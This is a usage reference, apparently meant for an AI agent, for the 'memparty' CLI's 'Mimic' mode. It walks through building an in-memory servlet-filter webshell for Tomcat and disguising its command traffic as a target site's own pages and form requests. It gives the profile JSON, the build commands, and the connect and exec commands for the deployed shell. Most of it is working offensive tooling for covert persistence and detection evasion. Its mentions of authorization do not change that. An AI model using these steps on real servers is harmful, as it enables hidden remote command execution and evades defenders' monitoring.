# Mimic custom shells

Read this reference only for `memparty profile`, `memparty custom build`, `memparty demo`, or `-t mimic`.

Mimic shapes command traffic after pages and requests observed on an authorized target site. The user must supply a site profile; the CLI does not crawl or automatically choose cover traffic. The profile contains response templates, request shapes, and an optional wire codec. `custom build` compiles a matching `javax.servlet.Filter` locally and wraps it through the MemShellParty `Custom` tool.

## 1. Inspect the site and write a profile

Inspect the homepage, a few representative pages, and the response for an unknown path when dynamic paths are planned. Match the site's dominant request and response shapes. Prefer self-contained pages: templates referencing external assets can produce an unrealistic request pattern.

```bash
memparty profile init acme --site http://target:8080
```

Edit `~/.memparty/profiles/acme.json` with file tools. There is no profile-fill command.

Important fields:

- `templates`: one or more response covers. Use the source of representative pages without inventing improvements. Each entry has `title`, `template`, and `contentType`. Non-HTML text can carry an explicit `{{payload}}` placeholder; HTML responses can use the configured marker. Two to four self-contained templates allow rotation.
- `paths`: real, same-origin path prefixes used with `--dynamic-path`, such as `["/api/", "/news/"]`.
- `request`: one request shape or an array with optional `weight`. `secretField` carries the ciphertext. `secretIn` is `"body"` (default), `"query"`, or `"header"`. `fields` supplies decoy form fields modeled on a real request.
- `request.bodyTemplate`: optional full body containing `{{payload}}`, for JSON, XML, GraphQL, SSE-related envelopes, or multipart forms. It takes precedence over flat form fields and requires `secretIn: "body"`. For multipart, write the boundary literally or specify it in `headers`.

Decoy values support `{{hex:N}}`, `{{b64:N}}`, `{{uuid}}`, `{{ts}}`, and `{{int:A:B}}`. Do not rely on the scaffold's lone `pass=<cipher>` request field.

Optional `cipher` fields:

| Field | Values |
|-------|--------|
| `algorithm` | `aes-ecb`, `aes-cbc` (random IV), `xor` |
| `encoding` | `base64`, `base64url`, `hex` |
| `padTail` | Append a key-derived-length random suffix |
| `marker` | `js-var`, `html-comment` |

Defaults are `aes-ecb`, `base64`, no tail, and `js-var`. The cipher is baked into the filter at build time; after changing it, rebuild and redeploy the shell.

Minimal example shape (use complete observed page bodies in the real file):

```json
{
  "name": "acme",
  "site": "http://target:8080",
  "createdAt": "2026-07-19T08:00:00.000Z",
  "templates": [
    {
      "title": "Observed page title",
      "template": "<!DOCTYPE html>\n<html>...complete observed page...</html>",
      "contentType": "text/html; charset=utf-8"
    }
  ],
  "paths": ["/news/", "/products/"],
  "request": {
    "secretField": "verCode",
    "fields": [
      {"name": "csrftoken", "value": "{{hex:32}}"},
      {"name": "j_username", "value": "admin"}
    ]
  },
  "cipher": {
    "algorithm": "aes-cbc",
    "encoding": "base64url",
    "padTail": true,
    "marker": "html-comment"
  }
}
```

Validate it before building:

```bash
memparty profile show acme
```

## 2. Build the server half

```bash
memparty custom build --profile acme --server Tomcat
```

The build:

1. Generates a randomly named `MimicFilter<rand>.java` and random credentials unless `--pass` / `--key` are supplied.
2. Compiles it with local `javac` and the bundled servlet API.
3. Submits the class as `shellTool=Custom` with the selected server, shell type, packer, and JDK.
4. Writes `.java`, `.class`, payload variants, and `manifest.json` to `<profile>-build/` by default.

Use `--out` to separate builds and `--packer` to select the delivery format. The manifest records credentials, cipher, class names, and the connection command. Generate a fresh class name for redeployment; a running JVM cannot redefine the same class.

The command builds the payload only. Deployment requires a separately authorized foothold. Do not claim the shell is active until `connect` succeeds.

## 3. Connect and execute

After deployment:

```bash
memparty connect -u http://target/ -t mimic --pass <pass> --key <key> \
  --profile acme --dynamic-path
memparty exec acme/mimic --cmd "whoami"
```

Omit `--dynamic-path` for a fixed URL. Dynamic paths also depend on the target application's own filters: check an unknown path and fall back to the working fixed path if necessary. A successful connection can save the profile with the target.

Mimic supports `exec`, not upload/download. Its method and timing behavior are fixed; this profile controls content and shape, not a guarantee that traffic is undetectable.

## 4. Test locally

```bash
memparty demo
```

Inspect the printed request and response against the profile. Confirm the expected carrier, body format, response marker or placeholder, and content type before relying on a deployment.

The filter probes configured carriers without consuming the request body stream. Undecryptable values pass through `chain.doFilter`; errors use the plain cover response so normal forms can continue to work.
